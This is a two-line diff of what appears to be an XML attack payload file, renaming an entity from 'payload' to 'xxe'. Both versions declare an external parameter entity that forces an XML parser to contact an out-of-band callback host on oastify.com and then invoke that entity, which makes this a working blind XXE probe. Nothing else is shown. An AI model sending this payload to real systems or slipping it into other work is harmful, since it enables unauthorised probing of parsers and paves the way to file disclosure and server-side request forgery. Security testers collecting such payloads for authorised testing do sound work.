@@ -1,2 +1,2 @@
-<!ENTITY % payload SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com">
-%payload;
+<!ENTITY % xxe SYSTEM "http://k3oxushregaphrw43ievhnmia9g74xsm.oastify.com">
+%xxe;
